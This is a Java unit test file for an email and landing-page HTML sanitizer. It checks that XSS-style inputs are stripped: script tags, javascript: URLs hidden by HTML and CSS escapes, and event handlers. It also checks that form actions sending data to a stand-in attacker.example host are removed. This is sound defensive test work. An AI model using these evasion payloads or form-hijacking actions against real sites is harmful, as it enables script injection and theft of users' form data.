package com.legent.content.service;

import com.legent.content.dto.EmailStudioDto;
import org.junit.jupiter.api.Test;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

class EmailContentValidationServiceTest {

    private final EmailContentValidationService service = new EmailContentValidationService();

    @Test
    void rejectsInteractiveEmailAndUnsafeScript() {
        EmailStudioDto.ValidationResponse response = service.validate(
                "<html amp4email><body><script>alert(1)</script><form><input name=\"email\"></form><amp-img></amp-img></body></html>",
                null);

        assertEquals("FAIL", response.getStatus());
        assertTrue(response.getAmpUnsupported());
        assertTrue(response.getErrors().stream().anyMatch(error -> error.contains("AMP")));
        assertTrue(response.getErrors().stream().anyMatch(error -> error.contains("Unsupported email tag")));
    }

    @Test
    void sanitizesUnsafeCssAndJavascriptUrls() {
        String sanitized = service.sanitize("<a href=\"javascript:alert(1)\" style=\"color:red;behavior:url(x)\">x</a>");

        assertFalse(sanitized.contains("javascript:"));
        assertFalse(sanitized.contains("behavior"));
        assertTrue(sanitized.contains("color:red"));
    }

    @Test
    void removesScriptTagsAndEventHandlers() {
        String sanitized = service.sanitize("<p onclick=\"alert(1)\">Hi</p><script>alert(1)</script>");

        assertTrue(sanitized.contains("<p>Hi</p>"));
        assertFalse(sanitized.contains("onclick"));
        assertFalse(sanitized.contains("<script"));
        assertFalse(sanitized.contains("alert(1)"));
    }

    @Test
    void removesEncodedJavascriptUrls() {
        String sanitized = service.sanitize("<a href=\"java&#x73;cript:alert(1)\">x</a>");

        assertTrue(sanitized.contains("<a>x</a>"));
        assertFalse(sanitized.toLowerCase().contains("javascript:"));
        assertFalse(sanitized.contains("href="));
    }

    @Test
    void removesUnsafeActionAndFormactionOnLandingPages() {
        String sanitized = service.sanitizeLandingPage("""
                <form action="javascript:alert(1)" method="post">
                    <button formaction="java&#x73;cript:alert(2)">Go</button>
                </form>
                """);

        assertTrue(sanitized.contains("<form method=\"post\">"));
        assertTrue(sanitized.contains("<button>Go</button>"));
        assertFalse(sanitized.toLowerCase().contains("javascript:"));
        assertFalse(sanitized.contains("action="));
        assertFalse(sanitized.contains("formaction="));
    }

    @Test
    void removesExternalActionAndFormactionOnLandingPages() {
        String sanitized = service.sanitizeLandingPage("""
                <form action="https://attacker.example/collect" method="post">
                    <button formaction="https://attacker.example/override">Go</button>
                </form>
                """);

        assertTrue(sanitized.contains("<form method=\"post\">"));
        assertTrue(sanitized.contains("<button>Go</button>"));
        assertFalse(sanitized.contains("https://attacker.example"));
        assertFalse(sanitized.contains("action="));
        assertFalse(sanitized.contains("formaction="));
    }

    @Test
    void removesRelativeActionAndFormactionOnLandingPagesUntilEndpointPolicyExists() {
        String sanitized = service.sanitizeLandingPage("""
                <form action="/api/public/landing-pages/submit" method="post">
                    <button formaction="/api/public/landing-pages/override">Go</button>
                </form>
                """);

        assertTrue(sanitized.contains("<form method=\"post\">"));
        assertTrue(sanitized.contains("<button>Go</button>"));
        assertFalse(sanitized.contains("/api/public/landing-pages"));
        assertFalse(sanitized.contains("action="));
        assertFalse(sanitized.contains("formaction="));
    }

    @Test
    void removesSrcsetAttributes() {
        String sanitized = service.sanitize("<img src=\"https://cdn.example.com/a.png\" srcset=\"javascript:alert(1) 1x\" alt=\"a\">");

        assertTrue(sanitized.contains("src=\"https://cdn.example.com/a.png\""));
        assertTrue(sanitized.contains("alt=\"a\""));
        assertFalse(sanitized.contains("srcset"));
        assertFalse(sanitized.toLowerCase().contains("javascript:"));
    }

    @Test
    void removesSvgAndMathmlContent() {
        String sanitized = service.sanitize("<p>Safe</p><svg><a href=\"javascript:alert(1)\">x</a></svg><math><mi>x</mi></math>");

        assertEquals("<p>Safe</p>", sanitized);
    }

    @Test
    void removesUnsafeCssUrls() {
        String sanitized = service.sanitize("<p style=\"color:red; background-image: url( java&#x73;cript:alert(1)); width:100%\">x</p>");

        assertTrue(sanitized.contains("color:red"));
        assertTrue(sanitized.contains("width:100%"));
        assertFalse(sanitized.contains("background-image"));
        assertFalse(sanitized.toLowerCase().contains("javascript:"));
    }

    @Test
    void removesUnsafeCssUrlsHiddenByCssEscapes() {
        String sanitized = service.sanitize("<p style=\"color:red; background-image: url(\\6a avascript:alert(1)); width:100%\">x</p>");

        assertTrue(sanitized.contains("color:red"));
        assertTrue(sanitized.contains("width:100%"));
        assertFalse(sanitized.contains("background-image"));
        assertFalse(sanitized.toLowerCase().contains("javascript:"));
    }

    @Test
    void landingPageSanitizerAllowsFormsButRemovesScripts() {
        String sanitized = service.sanitizeLandingPage("<form><input name=\"email\"><script>alert(1)</script></form>");

        assertTrue(sanitized.contains("<form>"));
        assertTrue(sanitized.contains("<input"));
        assertFalse(sanitized.contains("<script"));
    }
}
